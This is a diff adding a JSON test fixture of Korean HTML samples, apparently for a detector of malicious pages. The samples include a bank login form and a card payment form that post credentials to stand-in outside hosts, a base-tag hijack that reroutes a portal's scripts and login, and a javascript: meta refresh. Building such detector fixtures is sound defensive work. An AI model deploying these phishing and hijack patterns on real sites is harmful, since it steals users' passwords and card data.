@@ -1,0 +1,99 @@
+{
+  "samples": [
+    {
+      "id": "cross-origin-login",
+      "title": "로그인 폼이 남의 도메인으로",
+      "url": "https://mybank.example.com/login",
+      "html": [
+        "<!DOCTYPE html>",
+        "<html lang=\"ko\">",
+        "<head><meta charset=\"utf-8\"><title>회원 로그인</title></head>",
+        "<body>",
+        "  <h1>인터넷뱅킹 로그인</h1>",
+        "  <p>보안을 위해 로그인 후 30분간만 유지됩니다.</p>",
+        "  <form action=\"https://collect.example.net/p\" method=\"post\">",
+        "    <label>아이디 <input type=\"text\" name=\"uid\" autocomplete=\"username\"></label>",
+        "    <label>비밀번호 <input type=\"password\" name=\"pw\" autocomplete=\"current-password\"></label>",
+        "    <button type=\"submit\">로그인</button>",
+        "  </form>",
+        "</body>",
+        "</html>"
+      ]
+    },
+    {
+      "id": "form-to-ip",
+      "title": "결제 폼이 IP 주소로",
+      "url": "https://shop.example.org/pay",
+      "html": [
+        "<!DOCTYPE html>",
+        "<html lang=\"ko\">",
+        "<head><meta charset=\"utf-8\"><title>결제 정보 확인</title></head>",
+        "<body>",
+        "  <h1>주문 결제</h1>",
+        "  <form action=\"http://203.0.113.5/gate.php\" method=\"post\">",
+        "    <label>카드번호 <input type=\"text\" name=\"card\"></label>",
+        "    <label>비밀번호 앞 2자리 <input type=\"password\" name=\"pw\" maxlength=\"2\"></label>",
+        "    <button type=\"submit\">결제하기</button>",
+        "  </form>",
+        "</body>",
+        "</html>"
+      ]
+    },
+    {
+      "id": "base-hijack",
+      "title": "base 태그로 주소를 바꿔치기",
+      "url": "https://intra.example.com/portal",
+      "html": [
+        "<!DOCTYPE html>",
+        "<html lang=\"ko\">",
+        "<head>",
+        "  <meta charset=\"utf-8\"><title>사내 포털</title>",
+        "  <base href=\"https://cdn.example.net/hijack/\">",
+        "</head>",
+        "<body>",
+        "  <h1>사내 포털</h1>",
+        "  <script src=\"js/portal.js\"></script>",
+        "  <form action=\"account/login\" method=\"post\">",
+        "    <input type=\"text\" name=\"id\"><input type=\"password\" name=\"pw\">",
+        "    <button type=\"submit\">접속</button>",
+        "  </form>",
+        "  <a href=\"notice/list\">공지사항</a>",
+        "</body>",
+        "</html>"
+      ]
+    },
+    {
+      "id": "meta-js",
+      "title": "meta refresh 가 javascript: 로",
+      "url": "https://notice.example.org/",
+      "html": [
+        "<!DOCTYPE html>",
+        "<html lang=\"ko\">",
+        "<head>",
+        "  <meta charset=\"utf-8\"><title>공지 이동 중</title>",
+        "  <meta http-equiv=\"refresh\" content=\"0;url=javascript:location='?go'\">",
+        "</head>",
+        "<body>",
+        "  <p>잠시만 기다려 주세요...</p>",
+        "  <img src=\"loading.gif\" onerror=\"this.style.display='none'\">",
+        "</body>",
+        "</html>"
+      ]
+    },
+    {
+      "id": "data-doc",
+      "title": "iframe 이 data: 문서를 품음",
+      "url": "https://board.example.net/view",
+      "html": [
+        "<!DOCTYPE html>",
+        "<html lang=\"ko\">",
+        "<head><meta charset=\"utf-8\"><title>게시글 보기</title></head>",
+        "<body>",
+        "  <h1>첨부 문서 미리보기</h1>",
+        "  <iframe src=\"data:text/html;base64,PGgxPuyViOuFle2VmOyEuOyalDwvaDE+\" width=\"600\" height=\"200\"></iframe>",
+        "</body>",
+        "</html>"
+      ]
+    }
+  ]
+}
